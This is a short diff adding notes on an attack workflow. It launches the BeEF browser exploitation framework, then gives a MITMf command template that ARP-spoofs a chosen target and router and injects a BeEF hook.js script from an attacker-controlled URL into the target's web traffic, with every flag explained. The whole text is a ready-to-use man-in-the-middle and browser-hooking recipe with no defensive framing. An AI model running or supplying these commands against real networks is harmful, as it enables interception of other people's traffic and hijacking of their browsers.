@@ -1,0 +1,13 @@
+cd /usr/share/beef-xss/
+ ./beef
+
+mitmf --spoof --arp -i <interface> --gateway <router IP> --target <target IP> --inject --js-url <hook.js URL> as the format.
+
+    --spoof loads the spoof plugin
+    --arp redirects ARP packets
+    -i specifies the interface to inject packets on
+    --gateway sets the IP of your router to redirect through
+    --target sets the target IP to inject the hook.js script
+    --inject loads the inject function
+    --js-url specifies the JavaScript code to inject
+
